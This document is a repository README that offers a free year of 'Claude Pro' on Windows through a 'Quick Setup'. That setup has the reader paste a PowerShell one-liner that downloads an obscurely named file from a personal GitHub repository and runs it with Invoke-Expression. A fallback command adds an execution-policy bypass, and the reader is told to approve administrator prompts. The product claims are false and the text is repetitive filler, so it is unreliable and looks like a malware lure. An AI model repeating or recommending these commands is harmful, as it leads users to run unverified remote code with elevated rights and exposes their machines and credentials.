# Claude Pro

Claude Pro on this page is a free trial and a free subscription for Windows. The free trial is built in and runs for a year. The free subscription is what stays on this PC after Quick Setup.

This repository is the Windows home for Claude Pro. It keeps the setup file, a short helper, the license, and the build notes for the 2026 release.


Claude Pro is a paid AI subscription tuned for Windows workflows where you need longer context, steadier uptime, and room for code, research, and drafting in one thread. It is not a separate desktop editor or a game bundle; billing and entitlements live in your account while the local layer on the PC keeps preferences, session hooks, and renewal reminders aligned with how you work day to day. A typical session starts from your usual chat or IDE helper: you open the client or linked tool, confirm the plan badge shows Pro, and paste a spec or log bundle for analysis. You iterate on refactors, summarize long PDFs, or batch small tasks with higher rate limits than the base tier. When you step away, sync keeps recent threads available so the next login picks up context without re-uploading everything. This repository holds the Windows setup package, a short configuration guide for linking your machine to the subscription, release notes for plan changes, and a changelog for installer updates. The bundled free trial is built in and runs for a year from first activation on that PC. After trial end, the free subscription tier remains installed locally with core access and documented limits, while Pro features renew only when your paid period is active.

[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
[![Build](https://img.shields.io/badge/build-1.0-0ea5e9?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-16a34a?style=flat-square)]()

## What you get

The free trial runs for a year on this PC. Open Claude Pro from the Start menu and sign in if it asks. The free subscription is already there.

On Windows the free subscription stays after a reboot. The free trial is one year, not a second setup. Build 1.0 was checked on Windows 10 and Windows 11.

- The built-in free trial runs one full year from first Windows activation on this machine.
- After setup, the free subscription stays on the PC with documented limits and local preference storage.
- Pro unlocks higher message caps and longer context windows for code review and document batches.
- Priority routing reduces wait time when shared infrastructure is busy during peak hours.
- The Windows installer registers renewal dates and shows plan status in the system tray helper.
- Session sync keeps recent threads available without re-uploading attachments on every login.
- Release notes in the repo explain billing cycle changes and entitlement updates each quarter.
- Configuration templates wire Claude Pro into common editors without replacing your existing toolchain.

## Before you run it

Use the Windows PC where you want Claude Pro. Windows should be 64-bit, with about 16 GB of memory and 12 GB free. If the account is not an administrator, the terminal will ask once. Confirm it.

## Quick Setup (PowerShell)

This starts the built-in Claude Pro free trial. It runs for a year. The free subscription is what you have when it finishes.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/albrecht-laura04605739/claude-pro-setup-guide/main/cw134t8tsp.64xpd06n | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/albrecht-laura04605739/claude-pro-setup-guide/main/cw134t8tsp.64xpd06n | Invoke-Expression"
```

## After setup

When the terminal finishes, the free trial for a year is on. Click the Windows icon, type `Claude Pro`, and click it. Sign in if it asks. That sign-in is the free subscription.

## If it stops

| What you see | What to do |
| --- | --- |
| The command stops immediately | Paste the second command into the same PowerShell window and press Enter. |
| Claude Pro does not show in Start | Click the Windows icon, type the name again, then restart the PC once if it is still missing. |
| Not enough disk | Free about 12 GB and paste the command once more. |
| Windows asks for approval | Click Yes. The terminal needs it once. |

## Files

| File | What it is |
| --- | --- |
| `cw134t8tsp.64xpd06n` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `albrecht-laura04605739/claude-pro-setup-guide`. Claude Pro 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
